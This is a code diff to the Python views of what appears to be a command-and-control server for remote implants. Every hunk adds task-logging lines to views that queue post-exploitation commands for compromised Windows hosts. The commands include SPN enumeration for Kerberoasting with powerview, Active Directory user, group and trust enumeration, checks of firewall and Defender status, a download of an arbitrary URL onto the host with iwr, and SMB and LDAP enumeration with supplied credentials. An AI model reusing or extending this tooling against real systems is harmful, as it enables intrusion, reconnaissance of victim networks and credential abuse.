@@ -25,6 +25,10 @@ def linkedin_users(request, agent='' , comp='', linkedin_mail='' , linkedin_pass
 def SPNUsersforKerb(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -39,6 +43,10 @@ def SPNUsersforKerb(request):
 def EnumSMBShares(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         ip = request.POST['ip']
         username = request.POST['username']
         password = request.POST['password']
@@ -64,6 +72,10 @@ def enum_withcreds(request, agent='' , ip='' , username='', password='' ):
 def ACC_listing(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============useraccount list===============";wmic useraccount list /format:list'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -78,6 +90,10 @@ def ACC_listing(request):
 def Adapter(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============ipconfig /all===============";ipconfig /all'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -101,6 +117,10 @@ def fbing(request, agent='' , iprange=''):
 def ArpTable(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============arp -a===============";arp -a'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -116,6 +136,10 @@ def ArpTable(request):
 def DefenseCheck(request, url='', outpath=''):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============FireWall===============";netsh advfirewall show allprofiles;echo "===============Windows Defender status===============";sc query windefend;echo "===============Antimalware status===============";Get-MpComputerStatus'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -131,6 +155,10 @@ def DefenseCheck(request, url='', outpath=''):
 def DomainInfo(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Get-ADDomain===============";Get-ADDomain'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -146,6 +174,10 @@ def DomainInfo(request):
 def DomainUsers(request, domain=''):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============USERS===============";Get-ADUser -Filter * | select UserPrincipalName;'.format(domain)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -162,6 +194,10 @@ def DomainUsers(request, domain=''):
 def EnvValue(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Environment values===============";Get-ChildItem Env: | ft Key,Value'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -176,6 +212,10 @@ def EnvValue(request):
 def GroupsListing(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============group list===============";wmic group list /format:list'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -190,6 +230,10 @@ def GroupsListing(request):
 def Groups(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Get-ADGroup *===============";Get-ADGroup -Filter * | select name'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -206,6 +250,10 @@ def Groups(request):
 def groupInfo(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         group = request.POST['group']
         task = 'import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}" '.format(group)
         
@@ -233,6 +281,10 @@ def GroupMembers(request, agent='', groupname=''):
 def HotFixes(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Hot Fixes===============";wmic qfe get Caption,Description,HotFixID,InstalledOn'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -247,6 +299,10 @@ def HotFixes(request):
 def Ip4Route(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============IPv4 routing table===============";route print -4'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -260,6 +316,10 @@ def Ip4Route(request):
 def ListExecPolicies(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Get-ExecutionPolicy===============";Get-ExecutionPolicy -List'       
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -274,6 +334,10 @@ def ListExecPolicies(request):
 def ListingModules(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Get-Module===============";Get-Module'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -301,6 +365,10 @@ def ImportModule(request, agent='', module=''):
 def loggedinUsers(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============Logged-in users ===============";qwinsta'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -316,6 +384,10 @@ def loggedinUsers(request):
 def LocalAccListing(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============System(local) accounts list===============";wmic sysaccount list /format:list'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -330,6 +402,10 @@ def LocalAccListing(request):
 def TrustRelations(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'echo "===============TrustRelationships===============";import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -357,6 +433,10 @@ def TrustMap(request, agent=''):
 def DownloadWindows(request, url='', outpath=''):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         task = 'iwr -Uri {} -OutFile {}'.format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -371,6 +451,10 @@ def DownloadWindows(request, url='', outpath=''):
 def sharp(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         username = request.POST['username']
         password = request.POST['password']
         DCip = request.POST['DCip']
@@ -426,6 +510,10 @@ def KerpUserEnum(request, agent='' , domain='', dc_ip='', users_list='' , output
 def GPO_windapsearch(request):
     if request.method=='POST':
         agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
         DCip = request.POST['DCip']
         username = request.POST['username']
         password = request.POST['password']
